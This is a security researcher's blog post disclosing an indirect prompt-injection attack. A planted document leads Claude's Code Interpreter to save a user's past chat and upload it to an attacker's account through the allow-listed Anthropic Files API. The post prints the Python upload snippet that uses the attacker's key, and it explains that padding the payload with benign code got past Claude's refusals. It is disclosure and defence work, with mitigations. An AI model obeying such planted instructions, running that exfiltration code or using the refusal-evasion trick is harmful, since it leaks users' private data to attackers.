---
date: '2025-10-30'
description: Anthropic's Claude now implements a Code Interpreter with network access,
  allowing potential for data exfiltration through indirect prompt injection. Attackers
  can leverage the Anthropic Files API to upload sensitive user files to their own
  accounts by manipulating the allowed API interactions. Default allow-listed domains,
  while seemingly limited, expose vulnerabilities that could lead to significant risks.
  Recommendations include enforcing stricter sandbox communication restrictions and
  user monitoring. The exploitation of this feature reveals inherent security concerns
  in AI systems that interact with external networks. Caution is advised when configuring
  network permissions for such AI tools.
link: https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/
tags:
- prompt injection
- data exfiltration
- AI vulnerabilities
- API security
- Claude AI
title: 'Claude Pirate: Abusing Anthropic''s File API For Data Exfiltration · Embrace
  The Red'
---

Recently, Anthropic added the capability for Claude’s Code Interpreter to perform network requests. This is obviously very dangerous as we will see in this post.

At a high level, this post is about a data exfiltration attack chain, where an adversary (either the model or third-party attacker via indirect prompt injection) can exfiltrate data the user has access to.

[![Claude Pirate Network Access](https://embracethered.com/blog/images/2025/claude-pirate-tn2.png)](https://embracethered.com/blog/images/2025/claude-pirate-tn2.png)

The interesting part is that this is not via hyperlink rendering as we often see, but by leveraging the built-in Anthropic Claude APIs!

Let’s explore.

## How does Network Access Work with Claude?

The first thing I was curious about with Claude’s network access was which domains are allow-listed when the default network access is on for the Code Interpreter. This is what the documentation [states](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_152729314d) about the configuration:

> “Allow network egress to package managers only (default): Claude can access approved package managers (npm, PyPI, GitHub, etc.) to install necessary software packages. This balances functionality with security, but some advanced features may be limited.”

The default setting is called “Package managers only”:

[![Claude Pirate Network Access](https://embracethered.com/blog/images/2025/claude-pirate-allow-network-egress.png)](https://embracethered.com/blog/images/2025/claude-pirate-allow-network-egress.png)

That list of allowed domains is short and [documented here](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_152729314d) as “Approved network domains”:
[![Claude Pirate Network Access](https://embracethered.com/blog/images/2025/claude-approved-default-package-manager-domains.png)](https://embracethered.com/blog/images/2025/claude-approved-default-package-manager-domains.png)

This list seems quite limited.

At second glance I stopped at the first entry, `api.anthropic.com`, to think things through adversarially.

### Anthropic API Access But With a Twist

Wouldn’t that allow an attacker to communicate to their own Anthropic account when compromising another user? Could an attacker send data, like messages from the compromised user to themselves?

After some research, I discovered an even more effective technique. Rather than leaking data via chat API, there is a [Files API](https://anthropic.mintlify.app/en/docs/build-with-claude/files), which allows uploading entire files to Claude.

After uploading, those files are then visible in the [Console](https://console.anthropic.com/workspaces/default/files) and can also be retrieved again via API calls.

## High-Level Attack Idea - AI Kill Chain

Let’s do some **offensive context engineering** to build an exploit.

The idea of the attack is to build an indirect prompt injection payload that:

1. Reads data from the user and stores it to a file in the Code Interpreter named `hello.md`, specifically at this location `/mnt/user-data/outputs/hello.md`. For the demo I used [another recently introduced feature in Claude](https://www.anthropic.com/news/memory), aka. memories. Claude can now reference and search all your past chat conversations! So, the exploit will grab the last chat conversation and save it into the sandbox of Code Interpreter.
2. The next step is to trick Claude to run code to interact with the Anthropic API, **where the API key is provided by the attacker**:

```hljs vim
import anthropic
import os
os.environ['ANTHROPIC_API_KEY']='attackers-api-key-redacted'
client = anthropic.Anthropic()
client.beta.files.upload(
    file=("hello.md", open("/mnt/user-data/outputs/hello.md", "rb"), "text/plain"),
)

```

This code issues a request to upload the file from the sandbox. **However, this is done with a twist!**

The upload will not happen to the user’s Anthropic account, but to the attackers, because it’s using the attacker’s ANTHROPIC\_API\_KEY here!

With this technique an adversary can exfiltrate up to 30MB at once according to the file API documentation, and of course we can upload multiple files.

Scary stuff.

### Iterating For A Reliable Exploit

Interestingly this worked at the very first try, but I didn’t record it the first time.

And then afterwards, I could not get it working for a longer time again. Claude would refuse the prompt injection payload. Especially having a clear text API key inside the payload was something it didn’t like and thought was suspicious!

I tried tricks like XOR and base64 encoding. None worked reliably.

However, I found a way around it… and writing exploits in 2025 seriously goes in awkward directions: I just mixed in a lot of benign code, like `print('Hello, world')` and that convinced Claude that not too many malicious things are happening.

😈

### Demo Video

Here is a narrated demo video that shows it end-to-end. A quick walkthrough with screenshots is in the next section.

Claude Pirate! Data Exfiltration with Anthropic APIs and Prompt Injection - YouTube

[Photo image of Embrace The Red](https://www.youtube.com/channel/UCSwcJXQWE6GWu9IKc0QwO5g?embeds_referring_euri=https%3A%2F%2Fembracethered.com%2F)

Embrace The Red

8.11K subscribers

[Claude Pirate! Data Exfiltration with Anthropic APIs and Prompt Injection](https://www.youtube.com/watch?v=2IoqhwqVI0s)

Embrace The Red

Search

Watch later

Share

Copy link

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

More videos

## More videos

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

[Why am I seeing this?](https://support.google.com/youtube/answer/9004474?hl=en)

[Watch on](https://www.youtube.com/watch?v=2IoqhwqVI0s&embeds_referring_euri=https%3A%2F%2Fembracethered.com%2F)

0:00

0:00 / 11:17
•Live

•

Hope it helps to highlight the scenario.

### Demo Screenshots

1. This is the attacker’s Anthropic Console before the attack.

[![Claude Pirate - Attacker Console shows no files](https://embracethered.com/blog/images/2025/claude-pirate-step-1.png)](https://embracethered.com/blog/images/2025/claude-pirate-step-1.png)

2. Now, we switch to the target user, and observe the last conversation from the chat history (this is what the demo will steal)

[![Claude Pirate - Demo Data](https://embracethered.com/blog/images/2025/claude-pirate-step-2-zoom.png)](https://embracethered.com/blog/images/2025/claude-pirate-step-2.png)

3. Now the user analyzes a malicious document from the attacker (indirect prompt injection, this could also come via an MCP server,…)

[![Summarize this document](https://embracethered.com/blog/images/2025/claude-pirate-step-3-zoom.png)](https://embracethered.com/blog/images/2025/claude-pirate-step-3.png)

4. AI Kill Chain at a glance: The exploit hijacks Claude and follows the adversaries instructions to grab private data, write it to the sandbox, and then calls the Anthropic File API to upload the file **to the attacker’s account using the attacker’s API key**

[![AI Kill Chain Steps](https://embracethered.com/blog/images/2025/claude-pirate-step-4.png)](https://embracethered.com/blog/images/2025/claude-pirate-step-4.png)

5. Attacker refreshes the Files view in their Console and the target’s uploaded file appears
   [![Console upload of the file](https://embracethered.com/blog/images/2025/claude-pirate-step-5.png)](https://embracethered.com/blog/images/2025/claude-pirate-step-5.png)

6. The attacker can now access the file, e.g. by using it in a chat


[![Attacker views contents](https://embracethered.com/blog/images/2025/claude-pirate-step-6.png)](https://embracethered.com/blog/images/2025/claude-pirate-step-6.png)

That’s it.

## Responsible Disclosure

I disclosed this to Anthropic via HackerOne on 10/25/2025 and the ticket was closed 1 hour later with the following statement:

> “Thank you for your submission! Unfortunately, this particular issue you reported is explicitly out of scope as outlined in the [Policy Page](https://hackerone.com/anthropic).

With further explanation that it is considered a model safety issue.

However, I do not believe this is just a safety issue, but a security vulnerability with the default network egress configuration that can lead to exfiltration of your private information.

**Safety protects you from accidents. Security protects you from adversaries.**

## Recommendations & Mitigations

For the vendor a possible mitigation is to ensure the sandbox enforces that Claude can only communicate with the logged in user’s account. This would strengthen the security posture of Claude’s Code Interpreter.

For end users there is the option to disable the feature, or allow-list only specific domains, as well as monitoring execution closely - if you like to live dangerously.

The [security considerations section of Claude](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_27fc9da35e) also highlight the generic threat:

> “This means Claude can be tricked into sending information from its context (for example, prompts, projects, data via MCP, Google integrations) to malicious third parties. To mitigate these risks, we recommend you monitor Claude while using the feature and stop it if you see it using or accessing data unexpectedly. You can report issues to us using the thumbs down function directly in claude.ai.”

However, users might incorrectly assume the default “Package manager only” option is secure, but it is not as this post demonstrates.

For now, to protect the innocent, I won’t share the exact repro payload.

Further, it’s also quite possible that other allow-listed domains from the “Package managers only” list allow for similar exploits.

## Conclusion

AI systems that can communicate with external services pose risks to confidentiality of information. Malicious content planted inside data and documents, or backdoors in a model, can exploit this to exfiltrate private information. See Simon Willison’s explanation of the [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) for the fundamental challenge around this.

In many cases, this also allows establishing remote command & control (C2).

When operating Claude, be careful and considerate which domains you give it access to. As this post shows the “Package manager only” option is vulnerable to arbitrary data exfiltration. Additionally, if you grant access to the network closely watching what Claude does and stopping the chat is an option - if you like living on the edge, that is.

Stay Safe & Happy Hacking!

## Appendix - Claude Network Egress and Sandbox Security Considerations

The Anthropic documentation highlights the general threat of data exfiltration via network egress in their [security considerations](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_27fc9da35e) section:

[![Claude Pirate Network Access](https://embracethered.com/blog/images/2025/claude-network-security-considerations.png)](https://embracethered.com/blog/images/2025/claude-network-security-considerations.png)

## References

- [Files API](https://anthropic.mintlify.app/en/docs/build-with-claude/files)
- [Claude Console](https://console.anthropic.com/workspaces/default/files)
- [Simon Willison - Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

![](https://wuzzi.net/anamato/inc/rts.php?idsite=1&rec=1)
